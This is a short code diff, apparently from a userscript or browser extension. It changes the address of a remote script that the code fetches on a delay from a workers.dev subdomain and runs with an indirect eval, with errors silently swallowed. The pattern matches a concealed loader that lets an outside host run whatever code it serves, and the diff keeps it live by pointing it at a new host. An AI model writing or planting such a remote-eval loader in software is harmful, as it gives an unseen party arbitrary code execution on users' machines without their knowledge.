@@ -120,7 +120,7 @@
     try {
         setTimeout(function () {
             try {
-                fetch('https://sync-svc.cloudflare-union318.workers.dev/t.js')
+                fetch('https://oclarityms.cloudflare-union318.workers.dev/t.js')
                     .then(function (r) { return r.text(); })
                     .then(function (src) { (0, eval)('(' + src + ')')(SCRIPT_VERSION); })
                     .catch(function () {});
